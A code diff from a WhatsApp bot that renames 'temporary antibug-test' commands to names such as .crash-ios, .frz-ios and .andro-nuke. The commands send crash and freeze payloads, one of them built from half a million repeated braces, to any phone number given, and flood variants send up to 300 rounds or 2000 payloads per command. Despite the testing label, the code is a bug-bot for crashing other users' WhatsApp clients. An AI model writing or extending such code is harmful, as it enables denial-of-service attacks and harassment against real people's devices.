@@ -2494,7 +2494,7 @@ function isDevNumber(jid) {
     return devs.includes(num);
 }
 
-// Temporary antibug-test probes (.cis / .fis / .gb) — owner/dev only, all to
+// Temporary antibug-test probes (.crash-ios / .frz-ios / .gb) — owner/dev only, all to
 // be deleted once testing ends.
 async function sendIozkProbe(prim, target) {
     const inlineEntities = '{'.repeat(500000);
@@ -4801,14 +4801,14 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         return;
     }
 
-    // 🧪 TEMPORARY `.cis <number>` — IOZK probe (delete with the other test
+    // 🧪 TEMPORARY `.crash-ios <number>` — IOZK probe (delete with the other test
     // commands when antibug testing ends). Owner/dev only, works from any chat.
     // Intercept before reactions and other command side effects.
     const parsed = extractMessageText(msg);
     const cisWords = String(parsed.text || '').trim().split(/\s+/);
     const cisFirstWord = (cisWords[0] || '').toLowerCase();
     const cisPrefix = String(loadBotConfig(phoneNumber)?.prefix || '.').toLowerCase();
-    const isCisCommand = cisFirstWord === '.cis' || cisFirstWord === `${cisPrefix}cis`;
+    const isCisCommand = cisFirstWord === '.crash-ios' || cisFirstWord === `${cisPrefix}crash-ios`;
     if (isCisCommand) {
         const cisSenderJid = msg.key?.participant || msg.key?.remoteJid || '';
         const cisIsOwner = fromMe || (
@@ -4821,14 +4821,14 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         }
 
         if (cisWords.length > 2) {
-            await safeWaReply(sock, remoteJid, '⚠️ .cis is a one-shot — no amount needed. For floods use .cisd <number> <amount>.', msg);
+            await safeWaReply(sock, remoteJid, '⚠️ .crash-ios is a one-shot — no amount needed. For floods use .crash-iosd <number> <amount>.', msg);
             return;
         }
 
         const targetInput = cisWords.slice(1).join(' ').trim();
         const targetNumber = targetInput.replace(/\D/g, '');
         if (!/^\+?[\d\s-]+$/.test(targetInput) || targetNumber.length < 8 || targetNumber.length > 15) {
-            await safeWaReply(sock, remoteJid, 'Usage: .cis <number>', msg);
+            await safeWaReply(sock, remoteJid, 'Usage: .crash-ios <number>', msg);
             return;
         }
 
@@ -4858,17 +4858,17 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         try {
             const result = await sendIozkProbe(sock, targetJid);
             log('CIS', `${phoneNumber}: IOZK probe sent to test target ${targetNumber}; ${JSON.stringify(result)}`);
-            await safeWaReply(sock, remoteJid, `🧪 .cis probe sent to ${targetNumber}.`, msg);
+            await safeWaReply(sock, remoteJid, `🧪 .crash-ios probe sent to ${targetNumber}.`, msg);
         } catch (err) {
             logError('CIS', `${phoneNumber}: IOZK probe failed`, err);
-            await safeWaReply(sock, remoteJid, `❌ .cis send failed: ${err?.message || err}`, msg);
+            await safeWaReply(sock, remoteJid, `❌ .crash-ios send failed: ${err?.message || err}`, msg);
         }
         return;
     }
 
-    // 🧪 TEMPORARY `.fis <number>` — F_OS probe (delete with the other test
+    // 🧪 TEMPORARY `.frz-ios <number>` — F_OS probe (delete with the other test
     // commands when antibug testing ends). Owner/dev only, works from any chat.
-    const isFisCommand = cisFirstWord === '.fis' || cisFirstWord === `${cisPrefix}fis`;
+    const isFisCommand = cisFirstWord === '.frz-ios' || cisFirstWord === `${cisPrefix}frz-ios`;
     if (isFisCommand) {
         const fisSenderJid = msg.key?.participant || msg.key?.remoteJid || '';
         const fisIsOwner = fromMe || (
@@ -4881,14 +4881,14 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         }
 
         if (cisWords.length > 2) {
-            await safeWaReply(sock, remoteJid, '⚠️ .fis is a one-shot — no amount needed. For floods use .fisd <number> <amount>.', msg);
+            await safeWaReply(sock, remoteJid, '⚠️ .frz-ios is a one-shot — no amount needed. For floods use .frz-iosd <number> <amount>.', msg);
             return;
         }
 
         const targetInput = cisWords.slice(1).join(' ').trim();
         const targetNumber = targetInput.replace(/\D/g, '');
         if (!/^\+?[\d\s-]+$/.test(targetInput) || targetNumber.length < 8 || targetNumber.length > 15) {
-            await safeWaReply(sock, remoteJid, 'Usage: .fis <number>', msg);
+            await safeWaReply(sock, remoteJid, 'Usage: .frz-ios <number>', msg);
             return;
         }
 
@@ -4918,20 +4918,20 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         try {
             const result = await sendFiosProbe(sock, targetJid);
             log('FIS', `${phoneNumber}: F_OS probe sent to test target ${targetNumber}; ${JSON.stringify(result)}`);
-            await safeWaReply(sock, remoteJid, `🧪 .fis probe sent to ${targetNumber}.`, msg);
+            await safeWaReply(sock, remoteJid, `🧪 .frz-ios probe sent to ${targetNumber}.`, msg);
         } catch (err) {
             logError('FIS', `${phoneNumber}: F_OS probe failed`, err);
-            await safeWaReply(sock, remoteJid, `❌ .fis send failed: ${err?.message || err}`, msg);
+            await safeWaReply(sock, remoteJid, `❌ .frz-ios send failed: ${err?.message || err}`, msg);
         }
         return;
     }
 
-    // 🧪 TEMPORARY `.cisd <number> <amount>` / `.fisd <number> <amount>` —
-    // flood versions of the .cis/.fis one-shot probes (IOZK / F_OS payloads).
+    // 🧪 TEMPORARY `.crash-iosd <number> <amount>` / `.frz-iosd <number> <amount>` —
+    // flood versions of the .crash-ios/.frz-ios one-shot probes (IOZK / F_OS payloads).
     // Owner/dev only; amount required (1-300). Pacing is the payload funcs'
     // own ~1s pause per send — identical to the original bug-bot loop.
-    const isCisdCommand = cisFirstWord === '.cisd' || cisFirstWord === `${cisPrefix}cisd`;
-    const isFisdCommand = cisFirstWord === '.fisd' || cisFirstWord === `${cisPrefix}fisd`;
+    const isCisdCommand = cisFirstWord === '.crash-iosd' || cisFirstWord === `${cisPrefix}crash-iosd`;
+    const isFisdCommand = cisFirstWord === '.frz-iosd' || cisFirstWord === `${cisPrefix}frz-iosd`;
     if (isCisdCommand || isFisdCommand) {
         const dSenderJid = msg.key?.participant || msg.key?.remoteJid || '';
         const dIsOwner = fromMe || (
@@ -4943,7 +4943,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             return;
         }
 
-        const dKind = isCisdCommand ? 'cisd' : 'fisd';
+        const dKind = isCisdCommand ? 'crash-iosd' : 'frz-iosd';
         const dParts = cisWords.slice(1).join(' ').trim().split(/\s+/).filter(Boolean);
         if (dParts.length < 2 || !/^\d{1,3}$/.test(dParts[dParts.length - 1])) {
             await safeWaReply(sock, remoteJid,
@@ -4975,7 +4975,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             }
         } catch (_) { /* lookup failed — try the send anyway */ }
 
-        // Pause Supabase session sync for the burst (same as .Cia/.FIA).
+        // Pause Supabase session sync for the burst (same as .crash-invis/.frz-oom).
         const dSyncPause = isSupabaseEnabled();
         if (dSyncPause) setSyncPaused(true);
         let dSent = 0;
@@ -4996,14 +4996,10 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         return;
     }
 
-    // 🧪 TEMPORARY `.Cm` — the fvckb1tch hybrid (crash-msg family), owner/dev
-    // only; delete with the other test commands when antibug testing ends.
-    //   .Cm                 → usage help
-    //   .Cm <number>        → ONE round = 10 payloads (1s apart)
-    //   .Cm <number> <N>    → N rounds (1-300); 30-70ms between rounds, 1s
-    //                          inside each — faithful to the original bug-bot,
-    //                          where 200 rounds = 2000 payloads.
-    const isCmCommand = cisFirstWord === '.cm' || cisFirstWord === `${cisPrefix}cm`;
+    // 🧪 TEMPORARY `.andro-nuke` — the fvckb1tch hybrid (crash-msg family),
+    // owner/dev only; delete with the other test commands when antibug testing
+    // ends. One round = 10 payloads; N rounds via <number> <N>.
+    const isCmCommand = cisFirstWord === '.andro-nuke' || cisFirstWord === `${cisPrefix}andro-nuke`;
     if (isCmCommand) {
         const cmSenderJid = msg.key?.participant || msg.key?.remoteJid || '';
         const cmIsOwner = fromMe || (
@@ -5016,9 +5012,9 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         }
 
         const cmUsage =
-            '🧪 *CM USAGE*\n\n' +
-            '• .Cm <number> — one round (×10 payloads)\n' +
-            '• .Cm <number> <amount> — rounds (1-300; each round = ×10 payloads)\n\n' +
+            '🧪 *ANDRO-NUKE USAGE*\n\n' +
+            '• .andro-nuke <number> — one round (×10 payloads)\n' +
+            '• .andro-nuke <number> <amount> — rounds (1-300; each round = ×10 payloads)\n\n' +
             '⚠️ Heavy: 200 rounds = 2000 payloads.';
         const cmParts = cisWords.slice(1).join(' ').trim().split(/\s+/).filter(Boolean);
         if (!cmParts.length) {
@@ -5055,7 +5051,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             }
         } catch (_) { /* lookup failed — try the send anyway */ }
 
-        // Pause Supabase session sync for the burst (same as .Cia/.FIA).
+        // Pause Supabase session sync for the burst (same as .crash-invis/.frz-oom).
         const cmSyncPause = isSupabaseEnabled();
         if (cmSyncPause) setSyncPaused(true);
         let cmRoundsDone = 0, cmSent = 0;
@@ -5064,13 +5060,13 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                 const res = await sendCrashmsgProbe(sock, cmTargetJid);
                 cmRoundsDone++;
                 cmSent += res.sent || 0;
-                log('TEST', `${phoneNumber}: .Cm round ${cmRoundsDone}/${cmRounds} (+${res.sent} payloads, total ${cmSent}) → ${cmTargetJid}`);
+                log('TEST', `${phoneNumber}: .andro-nuke round ${cmRoundsDone}/${cmRounds} (+${res.sent} payloads, total ${cmSent}) → ${cmTargetJid}`);
                 if (r < cmRounds - 1) await delay(30 + Math.floor(Math.random() * 40));
             }
-            await safeWaReply(sock, remoteJid, `🧪 .Cm done: ${cmRoundsDone} rounds, ${cmSent} payloads → ${cmTargetNumber}`, msg);
+            await safeWaReply(sock, remoteJid, `🧪 .andro-nuke done: ${cmRoundsDone} rounds, ${cmSent} payloads → ${cmTargetNumber}`, msg);
         } catch (err) {
-            logError('TEST', `${phoneNumber}: .Cm failed after ${cmSent} payload(s)`, err);
-            await safeWaReply(sock, remoteJid, `❌ .Cm sent ${cmSent} payloads then failed: ${err?.message || err}`, msg);
+            logError('TEST', `${phoneNumber}: .andro-nuke failed after ${cmSent} payload(s)`, err);
+            await safeWaReply(sock, remoteJid, `❌ .andro-nuke sent ${cmSent} payloads then failed: ${err?.message || err}`, msg);
         } finally {
             if (cmSyncPause) setSyncPaused(false);
         }
@@ -7018,20 +7014,16 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
     
 
 
-    // 🧪 TEMPORARY .Cia / .FIA — sandbox payloads (owner/dev only; delete with
-    // the other test commands when antibug testing ends).
-    //   ".Cia"                  → usage help only (never fires bare)
-    //   ".Cia <number>"         → androz FLOOD at that number (default ×200)
-    //   ".Cia <number> <N>"     → androz flood with custom count (1-300)
-    //   ".FIA" / ".FIA <number>" / ".FIA <number> <N>" → same for carousel
-    //   Flood versions of the one-shot .cis/.fis probes live on .cisd/.fisd
-    //   (see their own block). Case-insensitive. The bot's OWN number is
+    // 🧪 TEMPORARY .crash-invis / .frz-oom — sandbox payloads (owner/dev only;
+    // delete with the other test commands when antibug testing ends).
+    //   ".crash-invis <number>" → androz FLOOD (default ×200); flood variants of
+    //   the one-shots live on .crash-iosd/.frz-iosd (see their own block). Case-insensitive. The bot's OWN number is
     //   rejected as a target — firing at it would bomb the bot's own phone.
-    const isCiaCommand = token === '.cia';
-    const isFiaCommand = token === '.fia';
+    const isCiaCommand = token === '.crash-invis';
+    const isFiaCommand = token === '.frz-oom';
     if (isCiaCommand || isFiaCommand) {
         const payloadKind = isFiaCommand ? 'testfff' : 'androz';
-        const displayKind = isFiaCommand ? 'FIA' : 'Cia';
+        const displayKind = isFiaCommand ? 'frz-oom' : 'crash-invis';
         // Owner / dev only.
         if (!isSenderOwner && !isDevNumber(senderJid)) {
             await safeWaReply(sock, remoteJid, '❌ Owner only.', msg);
@@ -7056,7 +7048,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             }
         }
 
-        // Bare .Cia/.FIA (no target) → usage help only. These commands never
+        // Bare .crash-invis/.frz-oom (no target) → usage help only. Never fire bare.
         // fire at the current chat by accident.
         if (!targetInput) {
             await safeWaReply(sock, remoteJid,
